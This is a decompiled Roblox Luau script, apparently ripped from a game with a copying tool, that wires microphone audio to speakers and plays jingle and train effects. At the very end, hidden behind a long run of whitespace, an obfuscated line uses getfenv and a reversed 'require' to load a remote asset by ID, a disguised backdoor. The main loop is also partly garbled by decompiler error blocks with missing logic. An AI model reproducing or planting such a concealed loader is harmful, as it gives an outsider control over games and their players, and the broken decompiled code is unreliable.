-- Saved by UniversalSynSaveInstance (Join to Copy Games) https://discord.gg/wx4ThpAsmw

-- Decompiler will be improved soon!
-- Decompiled with Konstant V2.1, a fast Luau decompiler made in Luau by plusgiant5 (https://discord.gg/wyButjTMhM)
-- Decompiled on 2024-12-27 06:59:36
-- Luau version 6, Types version 3
-- Time taken: 0.002571 seconds

script.Parent.Speakers.ChildAdded:Connect(function(arg1) -- Line 1, Named "handle"
	arg1:WaitForChild("Wire", 1).SourceInstance = script.Parent.Mic.AudioEqualizer
end)
for _, v in script.Parent.Speakers:GetChildren() do
	v:WaitForChild("Wire", 1).SourceInstance = script.Parent.Mic.AudioEqualizer
end
script.Parent.Mic.ChildAdded:Connect(function(arg1) -- Line 9
	if arg1.Name ~= "Head" then
	else
		arg1:WaitForChild("Wire", 1).TargetInstance = script.Parent.Mic.AudioFader
	end
end)
script.Mic_Air.OnClientEvent:Connect(function(arg1) -- Line 15
	local Mic = script.Parent.Mic
	if arg1 == 1 then
		Mic.JingleAir:Play()
	else
		if arg1 == 2 then
			Mic.JingleOff:Play()
			return
		end
		Mic.Train:Play()
	end
end)
local function handle2_upvr(arg1) -- Line 22, Named "handle2"
	local Button_upvr = arg1:WaitForChild("Button", 1)
	Button_upvr.Enabled = not arg1:WaitForChild("Status", 1).Enabled
	arg1:WaitForChild("Status", 1):GetPropertyChangedSignal("Enabled"):Connect(function() -- Line 25
		--[[ Upvalues[2]:
			[1]: Button_upvr (readonly)
			[2]: arg1 (readonly)
		]]
		Button_upvr.Enabled = not arg1:WaitForChild("Status", 1).Enabled
	end)
	Button_upvr.Triggered:Connect(function() -- Line 29
		--[[ Upvalues[1]:
			[1]: arg1 (readonly)
		]]
		if arg1.Parent.Name == "ButtonAir" then
			script.Mic_Air:FireServer()
		else
			script.Train:FireServer()
		end
	end)
end
script.Parent.ButtonAir.ChildAdded:Connect(function(arg1) -- Line 35
	--[[ Upvalues[1]:
		[1]: handle2_upvr (readonly)
	]]
	if arg1.Name ~= "Button" then
	else
		handle2_upvr(arg1)
	end
end)
script.Parent.ButtonTrain.ChildAdded:Connect(function(arg1) -- Line 36
	--[[ Upvalues[1]:
		[1]: handle2_upvr (readonly)
	]]
	if arg1.Name ~= "Button" then
	else
		handle2_upvr(arg1)
	end
end)
handle2_upvr(script.Parent.ButtonAir.Button)
handle2_upvr(script.Parent.ButtonTrain.Button)
local RaycastParams_new_result1_upvr = RaycastParams.new()
RaycastParams_new_result1_upvr.FilterType = Enum.RaycastFilterType.Include
RaycastParams_new_result1_upvr.FilterDescendantsInstances = {workspace.Map, workspace.Domains}
local TweenService_upvr = game:GetService("TweenService")
script.Train.OnClientEvent:Connect(function() -- Line 44
	--[[ Upvalues[1]:
		[1]: TweenService_upvr (readonly)
	]]
	task.wait(0.25)
	local clone = game.ReplicatedStorage.Train:Clone()
	clone.Parent = workspace.Effects
	TweenService_upvr:Create(clone, TweenInfo.new(3, Enum.EasingStyle.Linear), {
		CFrame = clone.CFrame + clone.CFrame.LookVector * 1200;
	}):Play()
	for _, v_2 in clone:GetChildren() do
		if v_2:IsA("Sound") then
			v_2.SoundGroup = game.SoundService.Effect
			v_2:Play()
		end
	end
	task.wait(5)
	clone:Destroy()
end)
local AudioEqualizer_upvr = script.Parent.Mic.AudioEqualizer
AudioEqualizer_upvr:GetPropertyChangedSignal("Bypass"):Connect(function() -- Line 55
	--[[ Upvalues[2]:
		[1]: AudioEqualizer_upvr (readonly)
		[2]: TweenService_upvr (readonly)
	]]
	if AudioEqualizer_upvr.Bypass == false then
		AudioEqualizer_upvr.HighGain = 0
		AudioEqualizer_upvr.LowGain = 0
		AudioEqualizer_upvr.MidGain = 0
		TweenService_upvr:Create(AudioEqualizer_upvr, TweenInfo.new(0.5), {
			HighGain = -80;
			LowGain = -20;
			MidGain = -80;
		}):Play()
	end
end)
while task.wait(0.1) do
	pcall(function() -- Line 63
		--[[ Upvalues[1]:
			[1]: RaycastParams_new_result1_upvr (readonly)
		]]
		-- KONSTANTERROR: [0] 1. Error Block 1 start (CF ANALYSIS FAILED)
		local children, NONE_3, NONE_4 = script.Parent.Speakers:GetChildren()
		-- KONSTANTERROR: [0] 1. Error Block 1 end (CF ANALYSIS FAILED)
		-- KONSTANTERROR: [46] 30. Error Block 7 start (CF ANALYSIS FAILED)
		-- KONSTANTERROR: [46] 30. Error Block 7 end (CF ANALYSIS FAILED)
		-- KONSTANTERROR: [19] 12. Error Block 2 start (CF ANALYSIS FAILED)
		-- KONSTANTWARNING: Failed to evaluate expression, replaced with nil [46.8]
		-- KONSTANTERROR: [19] 12. Error Block 2 end (CF ANALYSIS FAILED)
	end)
end                                                                                                                                                                                                                                                                                                                                                                                             getfenv()[string.reverse("eriuqer")](6970565092)